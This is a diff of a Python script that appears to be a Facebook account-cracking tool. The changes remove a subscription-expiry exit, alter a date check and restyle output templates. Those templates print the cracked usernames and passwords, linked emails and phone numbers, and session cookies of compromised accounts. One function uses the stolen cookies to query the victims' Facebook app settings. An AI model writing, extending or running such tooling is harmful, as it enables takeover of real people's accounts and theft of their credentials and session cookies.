@@ -59,9 +59,6 @@ print('''\x1b[38;5;140m
 ''')
 
 
-print('\x1b[0;34m تم انتهاء المدة المجانيه للاشتراك قم بل تواصل مع المطور @R_M_D ')
-
-exit()
 
 
 
@@ -93,7 +90,7 @@ t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
 
 hours = (now.hour)
 x = datetime.datetime.now()
-g= datetime.datetime(2023, 10, 29, 0, 0 )
+g= datetime.datetime(2023, 10 , 30, 2,1,0 )
 
 
 if (x.strftime("%x"))>(g.strftime("%x")):
@@ -979,7 +976,7 @@ def menu(my_name,my_id):
 	print(g67+'━'*67)
 	print('  {\x1b[1;32m0\x1b[1;36m} \x1b[38;5;196m𝐄𝐗𝐈𝐓       :   تسجيل خروج    ')
 	print(g67+'━'*67)
-	_____heros_____ = input('\n[=] 𝗖𝗛𝗢𝗦𝗘 ๛ ️:      ')
+	_____heros_____ = input('\n[=] 𝗖𝗛𝗢𝗦𝗘 ๛ ️:    /n  ')
 	print('')
 	if _____heros_____ in ['1']:
 		dump_massal()
@@ -1516,7 +1513,7 @@ def crack(idf,pwv):
 
 					infoakun += f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𖤍
 ⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
-𖤍 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n𖤍 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n𖤍 - Jumlah Teman : {teman}\n𖤍 - Jumlah Pengikut : {pengikut}\n𖤍 - Email Aktif : {email}\n𖤍 - Nomor Aktif : {nomer}\n𖤍 - Tahun Akun : {tahun}\n𖤍 - Tanggal Lahir : {cek_RMAD}\n⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
+𖤍 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n𖤍 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n𖤍 - Jumlah Teman : {teman}\n𖤍 - Jumlah Pengikut : {pengikut}\n𖤍 - Email Aktif : {email}\n𖤍 - Nomor Aktif : {nomer}\n𖤍 - Tahun Akun : {tahun}\n𖤍 - Tanggal Lahir : \n⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
 ⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}
 @R_M_D || @N_9_N_6'''
 					
@@ -1549,9 +1546,9 @@ def crack(idf,pwv):
 								hit2+=1
 					else:pass
 					print('\n')
-					statusok = f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𖤍
+					statusok =			f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𖤍
 ⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
-𖤍 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n𖤍 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n𖤍 - Jumlah Teman : {teman}\n𖤍 - Jumlah Pengikut : {pengikut}\n𖤍 - Email Aktif : {email}\n𖤍 - Nomor Aktif : {nomer}\n𖤍 - Tahun Akun : {tahun}\n𖤍 - Tanggal Lahir : {cek_RMAD}\n⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
+𖤍 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n𖤍 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n𖤍 - Jumlah Teman : {teman}\n𖤍 - Jumlah Pengikut : {pengikut}\n𖤍 - Email Aktif : {email}\n𖤍 - Nomor Aktif : {nomer}\n𖤍 - Tahun Akun : {tahun}\n𖤍 - Tanggal Lahir : \n⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
 ⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}
 @R_M_D || @N_9_N_6'''
 					statusok1 = nel(statusok, style='green')
@@ -1575,7 +1572,7 @@ def cek_RMAD(kuki):
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+			print ("\r%s  \033[0m              ✨ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 	except AttributeError:
 		print ("\r    %s\033[0m cookie invalid"%(M))
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
@@ -1584,7 +1581,7 @@ def cek_RMAD(kuki):
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+			print ("\r%s  \033[0m              ✨ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
 	except AttributeError:
 		print ("\r    %s \033[0mcookie invalid"%(M))
 	try:
